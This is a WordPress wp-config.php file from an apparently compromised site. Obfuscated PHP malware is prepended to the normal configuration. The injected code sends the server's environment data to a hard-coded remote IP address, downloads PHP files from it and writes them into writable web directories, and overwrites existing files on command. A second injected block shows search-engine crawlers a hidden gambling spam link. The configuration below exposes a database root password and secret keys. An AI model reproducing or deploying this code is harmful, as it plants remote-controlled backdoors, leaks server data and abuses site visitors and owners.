<?php if (!isset($incode))
{
    $vl = 'z';
    $serverid = '83cd4f12f97b92bdb835c639a8e0f4df';
    $server_addr = '222.133.206.225';
    function o0($oo0o, $oo, $oo0, $oO, $oOo, $ooooO)
    {
        $o0oo0 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0';
        if (ini_get('allow_url_fopen') == 1)
        {
            $o000 = stream_context_create(array(
                $ooooO => array(
                    'method' => 'POST',
                    'timeout' => $oOo,
                    'header' => array(
                        'Content-type: application/x-www-form-urlencoded',
                        'User-Agent: ' . $o0oo0,
                        'content' => http_build_query($_SERVER)
                    )
                )
            ));
            if ($oO == 'yes')
            {
                $oo0o = $oo0o . '&type=fopen';
            }
            $ooo = @file_get_contents($oo0o, false, $o000);
        }
        elseif (in_array('curl', get_loaded_extensions()))
        {
            if ($oO == 'yes')
            {
                $oo0o = $oo0o . '&type=curl';
            }
            $oo00O = curl_init();
            curl_setopt($oo00O, CURLOPT_URL, $oo0o);
            curl_setopt($oo00O, CURLOPT_HEADER, false);
            curl_setopt($oo00O, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($oo00O, CURLOPT_TIMEOUT, $oOo);
            curl_setopt($oo00O, CURLOPT_USERAGENT, $o0oo0);
            if ($ooooO == 'https')
            {
                curl_setopt($oo00O, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($oo00O, CURLOPT_SSL_VERIFYHOST, false);
            }
            curl_setopt($oo00O, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($oo00O, CURLOPT_POSTFIELDS, http_build_query($_SERVER));
            $ooo = @curl_exec($oo00O);
            curl_close($oo00O);
        }
        else
        {
            if ($oO == 'yes')
            {
                $oo0 = $oo0 . '&type=socks';
            }
            if ($ooooO == 'https')
            {
                $ooO = fsockopen('ssl://' . $oo, 443, $o0Ooo, $oO0, $oOo);
            }
            else
            {
                $ooO = fsockopen($oo, 80, $o0Ooo, $oO0, $oOo);
            }
            if ($ooO)
            {
                stream_set_timeout($ooO, $oOo);
                $oO0Oo = http_build_query($_SERVER);
                $o0O = 'POST ' . $oo0 . ' HTTP/1.0' . "\r\n";
                $o0O .= 'Host: ' . $oo . "\r\n";
                $o0O .= 'User-Agent: ' . $o0oo0 . "\r\n";
                $o0O .= 'Content-Type: application/x-www-form-urlencoded' . "\r\n";
                $o0O .= 'Content-Length: ' . strlen($oO0Oo) . "\r\n\r\n";
                fwrite($ooO, $o0O);
                fwrite($ooO, $oO0Oo);
                $oooO = '';
                while (!feof($ooO))
                {
                    $oooO .= fgets($ooO, 4096);
                }
                fclose($ooO);
                list($ooOO, $oO0oo) = @preg_split("/\R\R/", $oooO, 2);
                $ooo = $oO0oo;
            }
        }
        return $ooo;
    }
    function ooO($o0OO)
    {
        $o0oo[0] = (int)($o0OO / 256 / 256 / 256);
        $o0oo[1] = (int)(($o0OO - $o0oo[0] * 256 * 256 * 256) / 256 / 256);
        $o0oo[2] = (int)(($o0OO - $o0oo[0] * 256 * 256 * 256 - $o0oo[1] * 256 * 256) / 256);
        $o0oo[3] = $o0OO - $o0oo[0] * 256 * 256 * 256 - $o0oo[1] * 256 * 256 - $o0oo[2] * 256;
        return '' . $o0oo[0] . "." . $o0oo[1] . "." . $o0oo[2] . "." . $o0oo[3];
    }
    function o0O00($o0o0)
    {
        $o0Oo = array();
        $o0Oo[] = $o0o0;
        foreach (scandir($o0o0) as $oo00)
        {
            if ($oo00 == '.' || $oo00 == '..')
            {
                continue;
            }
            $oOO0 = $o0o0 . DIRECTORY_SEPARATOR . $oo00;
            if (is_dir($oOO0))
            {
                $o0Oo[] = $oOO0;
                $o0Oo = array_merge($o0Oo, o0O00($oOO0));
            }
        }
        return $o0Oo;
    }
    $oOoo = @preg_replace('/^www\./', '', $_SERVER['HTTP_HOST']);
    $oo = ooO('3104709758');
    $oo0 = '/get.php?spider&checkdomain&host=' . $oOoo . '&serverid=' . $serverid . '&stookfile=' . __FILE__;
    $oo0o = 'http://' . $oo . '/get.php?spider&checkdomain&host=' . $oOoo . '&serverid=' . $serverid . '&stookfile=' . __FILE__;
    $oo0OO = o0($oo0o, $oo, $oo0, $oO = 'no', $oOo = '30', $ooooO = 'http');
    if ($oo0OO != 'havedoor|havedonor')
    {
        $o0 = $_SERVER['HTTP_HOST'];
        $oo0O = @preg_replace('/^www\./', '', $_SERVER['HTTP_HOST']);
        $oO00 = $_SERVER['DOCUMENT_ROOT'];
        chdir($oO00);
        $o0Oo = o0O00($oO00);
        $o0Oo = array_unique($o0Oo);
        foreach ($o0Oo as $oo00)
        {
            if (is_dir($oo00) && is_writable($oo00))
            {
                $o0O0o = explode(DIRECTORY_SEPARATOR, $oo00);
                $oOo0 = count($o0O0o);
                $oOoOo[] = $oOo0 . '|' . $oo00;
            }
        }
        $oOo0 = 0;
        foreach ($oOoOo as $ooo0)
        {
            if (count($oOoOo) > 1 && (strstr($ooo0, '/wp-admin') || strstr($ooo0, '/cgi-bin')))
            {
                unset($oOoOo[$oOo0]);
            }
            $oOo0++;
        }
        if (!is_writable($oO00))
        {
            natsort($oOoOo);
            $oOoOo = array_values($oOoOo);
            $ooo0 = explode('|', $oOoOo[0]);
            $ooo0 = $ooo0[1];
        }
        else
        {
            $ooo0 = $oO00;
        }
        chdir($ooo0);
        if (stristr($oo0OO, 'nodoor'))
        {
            $oo0o = 'http://' . $oo . '/get.php?vl=' . $vl . '&update&needfilename';
            $oo0 = '/get.php?vl=' . $vl . '&update&needfilename';
            $o0o = o0($oo0o, $oo, $oo0, $oO = 'no', $oOo = '55', $ooooO = 'http');
            $oo0oO = explode('|||||', $o0o);
            $oOoOO = $oo0oO[0] . '.php';
            $o00o = $oo0oO[1];
            file_put_contents($ooo0 . DIRECTORY_SEPARATOR . $oOoOO, $o00o);
            $o00 = str_replace($oO00, '', $ooo0);
            if ($_SERVER['SERVER_PORT'] == '443')
            {
                $ooooO = 'https';
            }
            else
            {
                $ooooO = 'http';
            }
            $oo0o = $ooooO . '://' . $o0 . $o00 . '/' . $oOoOO . '?gen&serverid=' . $serverid;
            $oo0 = $o00 . '/' . $oOoOO . '?gen&serverid=' . $serverid;
            $ooOoO = o0($oo0o, $o0, $oo0, $oO = 'no', $oOo = '55', $ooooO);
        }
        elseif (stristr($oo0OO, 'needtoloadsomefiles'))
        {
            shuffle($oOoOo);
            $ooo0 = explode('|', $oOoOo[0]);
            $ooo0 = $ooo0[1];
            $o00 = str_replace($oO00, '', $ooo0);
            $o0oO = 'stuvwxyz';
            $oOoOO = str_shuffle($o0oO) . '.php';
            $ooOo = urlencode($ooooO . '://' . $o0 . $o00 . '/' . $oOoOO);
            $oo0o = 'http://' . $oo . '/get.php?bdr&url=' . $ooOo;
            $oo0 = '/get.php?bdr&url=' . $ooOo;
            $ooo = o0($oo0o, $oo, $oo0, $oO = 'no', $oOo = '20', $ooooO = 'http');
            file_put_contents($ooo0 . DIRECTORY_SEPARATOR . $oOoOO, $ooo);
        }
        elseif (stristr($oo0OO, 'needtoloadclient'))
        {
            $oo0o = 'http://' . $oo . '/get.php?getclient&domain=' . $oo0O;
            $oo0 = '/get.php?getclient&domain=' . $oo0O;
            $ooo = o0($oo0o, $oo, $oo0, $oO = 'no', $oOo = '55', $ooooO = 'http');
            if ($ooo != 'noclient')
            {
                $oOO0o = explode('::::', $ooo);
                $ooO0 = $oOO0o[0];
                $ooOOO = $oOO0o[1];
                if (file_exists($ooO0))
                {
                    if (!is_writable($ooO0))
                    {
                        @chmod($ooO0, '0644');
                        @file_put_contents($ooO0, $ooOOO);
                        if (!is_writable($ooO0))
                        {
                            @unlink($ooO0);
                            @file_put_contents($ooO0, $ooOOO);
                        }
                    }
                    else
                    {
                        @file_put_contents($ooO0, $ooOOO);
                    }
                }
                else
                {
                    @file_put_contents($ooO0, $ooOOO);
                }
            }
        }
        elseif ($oo0OO == 'needtowait')
        {
        }
        if (stristr($oo0OO, 'nodonor'))
        {
        }
    }
    $incode = 1;
} ?><?php if (!@$codevyp)
{
    if (preg_match('/alltheweb|aol|baidu|bing|crawler|dogpile|duckduckbot|google|inktomi|israelisearch|lycos|msn|scooter|slurp|spider|t-rex|teoma|yahoo|seznam/i', $_SERVER['HTTP_USER_AGENT']))
    {
        echo "<a href='http://playthemegapool.com/about.php' style=\"font-size:30px;color:black;margin-top:20px !important;background:white;position:absolute;margin-left:20px;\">Join Us</a><br />";
    }
    @$codevyp = true;
} ?><?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //

/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'DWwBw6FCkewY');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

define('FS_METHOD', 'direct');
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
*/
define('AUTH_KEY', 'jAaZP*B]P%:7?jXZ9zQaeChxWGIZF6|.eQa7[&:iSeLW [#kq|24m9?- +.J~{`3');
define('SECURE_AUTH_KEY', 'd(I{Jp(NJFCL0V@9Fm;qS+d^e/|G7+jJDpJKfOG83TnXmnX4B/+I{/TZ%%aHo?q0');
define('LOGGED_IN_KEY', 'R+|}~9@W6 u7p1]Q/a*O={R$.RV)u`j&yL3%9IGdu3rI=1W.%Ih&{a<if-Nc.xl0');
define('NONCE_KEY', 'mU.UuNy:`zcvpRA!:#CNyf.Pr|zKlC`(hD~ER&aXD S.=xE]Wz{Pu**~>*15F5H[');
define('AUTH_SALT', 'E87.4H!}4607Ab~lkB:uZa{^S&$$WoxsqrIgxyH|&cOE+gQd]G^p_ly$0*v?T4iN');
define('SECURE_AUTH_SALT', 'TWVERO2;ZJDn**{JNRRoi1E,/maY_k)6{&(A.vcVuTSl`]]E.NvwX(t{kXn&Nw]P');
define('LOGGED_IN_SALT', ']i!U/)<gK/S-vv2jHC^4I6=21Sj(B{kA&kd%&.yt-tA8G[`cf2E1zEZ>3ny%~B23');
define('NONCE_SALT', ';;[8n:T?cABiC>-szNny5nF<->3.3eQu1`.]>vU<nMd2j>$aLHS <<?g(a10mW_I');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define('WP_DEBUG', true);

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if (!defined('ABSPATH'))
{
    define('ABSPATH', __DIR__ . '/');
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

